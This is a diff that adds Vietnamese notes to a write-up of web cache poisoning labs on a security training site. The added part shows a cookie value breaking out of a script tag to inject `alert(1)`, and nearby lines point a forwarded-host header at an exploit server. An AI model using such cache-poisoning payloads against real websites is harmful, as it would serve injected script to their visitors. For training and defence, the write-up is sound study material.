@@ -13,6 +13,20 @@ Và server sẽ lưu cache trong thời gian 30s. Như vậy, để thực thi �
 Submit request với header `X-Forwarded-Host: https://exploit-0aa1003b03e760a1c112deb4012a0067.exploit-server.net` cho đến khi kết quả được reflected trong response (khi cache hết hạn). Kết quả thành công.
 
 # 2. Web cache poisoning with an unkeyed cookie
+Website có cookie "fehost=prod-cache-01", được reflected trong response như sau:
+```
+<script>
+    data = {
+        "host":"0a6b00a5031f6272c0c895f1009600fe.web-security-academy.net",
+        "path":"/",
+        "frontend":"prod-cache-01"
+    }
+</script>
+```
+
+Thử thay đổi `cookie=prod-cache-01"</script>`, submit đến khi response mới được lưu vào cache. Nhận thấy dấu nháy kép và dấu đóng mở tag được cho phép, khiến ta có thể escape javascript string và script tag.
+
+Bắt request với Burp Repeater, thử thay đổi `cookie=prod-cache-01"}</script><script>alert(1)</script>` rồi đợi đến khi cache hết hạn và submit. Kết quả bài lab được giải.
 
 # 3. Web cache poisoning with multiple headers
 
